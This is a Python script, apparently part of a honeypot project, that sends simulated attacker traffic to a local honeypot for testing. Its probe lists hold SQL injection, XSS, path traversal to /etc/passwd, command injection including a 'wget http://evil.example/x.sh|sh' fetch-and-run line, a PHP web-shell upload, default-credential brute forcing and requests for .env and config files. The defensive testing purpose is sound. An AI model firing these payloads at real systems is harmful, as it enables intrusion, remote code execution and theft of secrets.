"""Fire realistic-looking attacker traffic at a running honeypot.

Usage:
    python tools/simulate_attacks.py [--host 127.0.0.1] [--port 8080] [--rounds 1]
"""
from __future__ import annotations

import argparse
import random
import time
from typing import Iterable, Tuple

import requests

# (method, path, params, data, user_agent)
Probe = Tuple[str, str, dict, dict, str]


def benign_probes(base: str) -> Iterable[Probe]:
    yield ("GET", "/", {}, {}, "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0")
    yield ("GET", "/robots.txt", {}, {}, "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0")
    yield ("GET", "/api/v1/status", {}, {}, "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0")


def scanner_probes(base: str) -> Iterable[Probe]:
    nikto = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Default)"
    for path in ("/admin/", "/wp-login.php", "/phpmyadmin/", "/server-status",
                 "/.git/config", "/.env", "/cgi-bin/test.cgi"):
        yield ("GET", path, {}, {}, nikto)


def sqlmap_probes(base: str) -> Iterable[Probe]:
    sqlmap = "sqlmap/1.7.2#stable (https://sqlmap.org)"
    payloads = [
        "1' OR 1=1 --",
        "1' UNION SELECT username,password FROM users --",
        "1; SELECT SLEEP(5) --",
        "1' AND 1=1 --",
        "1\" OR \"1\"=\"1",
    ]
    for p in payloads:
        yield ("GET", "/api/v1/users", {"id": p}, {}, sqlmap)


def xss_probes(base: str) -> Iterable[Probe]:
    ua = "Mozilla/5.0 (Windows NT 10.0; rv:123.0) Gecko/20100101 Firefox/123.0"
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "javascript:alert(1)",
    ]
    for p in payloads:
        yield ("GET", "/", {"q": p}, {}, ua)


def lfi_probes(base: str) -> Iterable[Probe]:
    ua = "curl/8.4.0"
    paths = [
        "/index.php?file=../../../../etc/passwd",
        "/download?path=..%2f..%2f..%2fetc%2fpasswd",
        "/?page=php://filter/convert.base64-encode/resource=index",
    ]
    for p in paths:
        yield ("GET", p, {}, {}, ua)


def rce_probes(base: str) -> Iterable[Probe]:
    ua = "python-requests/2.31.0"
    payloads = [
        "/cgi-bin/test?cmd=;cat /etc/passwd",
        "/api/v1/users?name=`id`",
        "/api/v1/users?name=$(uname -a)",
        "/?op=test;wget http://evil.example/x.sh|sh",
    ]
    for p in payloads:
        yield ("GET", p, {}, {}, ua)


def webshell_probes(base: str) -> Iterable[Probe]:
    ua = "Mozilla/5.0 (compatible; Baiduspider/2.0)"
    yield ("GET", "/uploads/shell.php", {}, {}, ua)
    yield ("POST", "/upload.php",
           {}, {"f": "<?php system($_GET['c']); ?>"}, ua)


def brute_force_probes(base: str) -> Iterable[Probe]:
    ua = "Mozilla/5.0 (Hydra/9.5)"
    pairs = [
        ("admin", "admin"), ("admin", "password"), ("admin", "12345"),
        ("root", "toor"), ("administrator", "administrator"),
        ("alice", "summer2024"), ("bob", "letmein"),
    ]
    for user, pwd in pairs:
        yield ("POST", "/login", {}, {"username": user, "password": pwd}, ua)


def sensitive_file_probes(base: str) -> Iterable[Probe]:
    ua = "Mozilla/5.0 (compatible; gobuster)"
    for path in ("/.env", "/.git/config", "/wp-config.php"):
        yield ("GET", path, {}, {}, ua)


def fire(probe_iter: Iterable[Probe], base: str, source_label: str) -> None:
    for method, path, params, data, ua in probe_iter:
        url = base.rstrip("/") + path
        headers = {"User-Agent": ua}
        try:
            if method == "GET":
                r = requests.get(url, params=params, headers=headers, timeout=5)
            else:
                r = requests.post(url, params=params, data=data,
                                  headers=headers, timeout=5)
            print(f"  [{source_label}] {method} {path} -> {r.status_code}")
        except Exception as exc:
            print(f"  [{source_label}] {method} {path} -> ERROR {exc}")
        time.sleep(0.05 + random.random() * 0.1)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--rounds", type=int, default=1,
                    help="how many times to repeat the full attack matrix")
    args = ap.parse_args()
    base = f"http://{args.host}:{args.port}"
    print(f"[simulator] target {base}, {args.rounds} round(s)")
    for r in range(args.rounds):
        print(f"-- round {r + 1}/{args.rounds} --")
        fire(benign_probes(base),         base, "browser")
        fire(scanner_probes(base),        base, "nikto")
        fire(sqlmap_probes(base),         base, "sqlmap")
        fire(xss_probes(base),            base, "xss-bot")
        fire(lfi_probes(base),            base, "lfi-bot")
        fire(rce_probes(base),            base, "rce-bot")
        fire(webshell_probes(base),       base, "shell-bot")
        fire(brute_force_probes(base),    base, "hydra")
        fire(sensitive_file_probes(base), base, "gobuster")
    print("[simulator] done")


if __name__ == "__main__":
    main()
